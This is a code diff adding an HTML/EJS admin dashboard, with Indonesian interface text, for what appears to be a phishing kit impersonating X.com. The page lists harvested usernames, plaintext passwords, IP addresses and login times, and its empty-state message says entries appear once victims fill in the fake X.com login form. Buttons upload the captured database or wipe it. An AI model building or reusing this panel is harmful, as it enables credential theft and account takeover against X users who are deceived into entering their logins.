@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Admin Dashboard - X.com Portal</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      margin: 0;
+      padding: 20px;
+      background-color: #000000;
+      color: #ffffff;
+    }
+
+    .container {
+      background-color: #000000;
+      border-radius: 16px;
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
+      padding: 30px;
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+
+    .logo {
+      margin-bottom: 20px;
+      display: flex;
+      align-items: center;
+    }
+
+    .logo svg {
+      height: 30px;
+      fill: #ffffff;
+      margin-right: 15px;
+    }
+
+    h1 {
+      margin-top: 0;
+      color: #ffffff;
+      font-size: 24px;
+      margin-bottom: 20px;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 20px;
+      color: #ffffff;
+    }
+
+    th, td {
+      padding: 12px 15px;
+      text-align: left;
+      border-bottom: 1px solid #2f3336;
+    }
+
+    th {
+      background-color: #15181c;
+      color: #1d9bf0;
+      font-weight: 700;
+    }
+
+    tr:hover {
+      background-color: #15181c;
+    }
+
+    .empty-message {
+      text-align: center;
+      padding: 30px;
+      color: #71767b;
+      font-style: italic;
+    }
+
+    .timestamp {
+      white-space: nowrap;
+      font-size: 14px;
+      color: #71767b;
+    }
+
+    .password {
+      font-family: monospace;
+      color: #f44336;
+    }
+
+    .username {
+      color: #1d9bf0;
+    }
+
+    .source {
+      color: #03dac6;
+    }
+
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    .data-count {
+      background-color: #15181c;
+      padding: 8px 16px;
+      border-radius: 20px;
+      font-size: 14px;
+      color: #1d9bf0;
+    }
+
+    .btn-delete {
+      background-color: #f44336;
+      color: #ffffff;
+      padding: 8px 20px;
+      border: none;
+      border-radius: 20px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .btn-delete:hover {
+      background-color: #d32f2f;
+    }
+
+    .btn-upload {
+      background-color: #1d9bf0;
+      color: #ffffff;
+      padding: 8px 20px;
+      border: none;
+      border-radius: 20px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      margin-right: 10px;
+    }
+
+    .btn-upload:hover {
+      background-color: #1a8cd8;
+    }
+
+    .btn-upload:disabled {
+      background-color: #71767b;
+      cursor: not-allowed;
+    }
+
+    .upload-status {
+      margin-top: 10px;
+      padding: 10px;
+      border-radius: 8px;
+      font-size: 14px;
+    }
+
+    .upload-success {
+      background-color: #1d9bf0;
+      color: #ffffff;
+    }
+
+    .upload-error {
+      background-color: #f44336;
+      color: #ffffff;
+    }
+
+    .delete-status {
+      margin-top: 10px;
+      padding: 10px;
+      border-radius: 8px;
+      font-size: 14px;
+    }
+
+    .delete-success {
+      background-color: #4caf50;
+      color: #ffffff;
+    }
+
+    .delete-error {
+      background-color: #f44336;
+      color: #ffffff;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <svg viewBox="0 0 24 24" aria-hidden="true">
+        <g>
+          <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
+        </g>
+      </svg>
+      <h1>X.com Portal - Admin Dashboard</h1>
+    </div>
+
+    <div class="header">
+      <div class="data-count">Total Entries: <%= users.length %></div>
+      <div>
+        <button class="btn-upload" onclick="uploadDatabase()">Upload Database</button>
+        <button class="btn-delete" onclick="deleteAllData()">Hapus Semua Data</button>
+      </div>
+    </div>
+
+    <div id="upload-status" class="upload-status" style="display: none;"></div>
+
+    <% if (users.length > 0) { %>
+      <table>
+        <thead>
+          <tr>
+            <th>No</th>
+            <th>Username</th>
+            <th>Password</th>
+            <th>IP Address</th>
+            <th>Source</th>
+            <th>Waktu Login</th>
+          </tr>
+        </thead>
+        <tbody>
+          <% users.forEach((user, index) => { %>
+            <tr>
+              <td><%= index + 1 %></td>
+              <td class="username"><%= user.username %></td>
+              <td class="password"><%= user.password %></td>
+              <td><%= user.ip_address %></td>
+              <td class="source"><%= user.source %></td>
+              <td class="timestamp"><%= user.timestamp %></td>
+            </tr>
+          <% }) %>
+        </tbody>
+      </table>
+    <% } else { %>
+      <div class="empty-message">
+        Tidak ada data login ditemukan. Data akan muncul setelah pengguna mengisi form login X.com.
+      </div>
+    <% } %>
+  </div>
+
+  <script>
+    async function uploadDatabase() {
+      const uploadBtn = document.querySelector('.btn-upload');
+      const statusDiv = document.getElementById('upload-status');
+      
+      // Disable button and show loading
+      uploadBtn.disabled = true;
+      uploadBtn.textContent = 'Uploading...';
+      statusDiv.style.display = 'none';
+      
+      try {
+        const response = await fetch('/admin/upload-db', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          }
+        });
+        
+        const result = await response.json();
+        
+        if (result.success) {
+          statusDiv.className = 'upload-status upload-success';
+          statusDiv.textContent = '✅ Database uploaded successfully!';
+        } else {
+          statusDiv.className = 'upload-status upload-error';
+          statusDiv.textContent = '❌ Upload failed: ' + result.message;
+        }
+      } catch (error) {
+        statusDiv.className = 'upload-status upload-error';
+        statusDiv.textContent = '❌ Upload failed: ' + error.message;
+      }
+      
+      // Show status and re-enable button
+      statusDiv.style.display = 'block';
+      uploadBtn.disabled = false;
+      uploadBtn.textContent = 'Upload Database';
+      
+      // Hide status after 5 seconds
+      setTimeout(() => {
+        statusDiv.style.display = 'none';
+      }, 5000);
+    }
+
+    async function deleteAllData() {
+      if (confirm('Apakah Anda yakin ingin menghapus semua data login? Ini tidak dapat dibatalkan.')) {
+        const statusDiv = document.getElementById('upload-status');
+        statusDiv.style.display = 'none'; // Hide previous status
+        statusDiv.textContent = 'Menghapus data...';
+        statusDiv.style.display = 'block';
+
+        try {
+          const response = await fetch('/admin/delete', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            }
+          });
+
+          const result = await response.json();
+
+          if (result.success) {
+            statusDiv.className = 'upload-status upload-success';
+            statusDiv.textContent = `✅ ${result.deletedCount} data berhasil dihapus!`;
+            // Reload the page to show updated data
+            setTimeout(() => {
+              location.reload();
+            }, 2000);
+          } else {
+            statusDiv.className = 'upload-status upload-error';
+            statusDiv.textContent = '❌ Gagal menghapus data: ' + result.message;
+          }
+        } catch (error) {
+          statusDiv.className = 'upload-status upload-error';
+          statusDiv.textContent = '❌ Gagal menghapus data: ' + error.message;
+        }
+      }
+    }
+  </script>
+</body>
+</html>
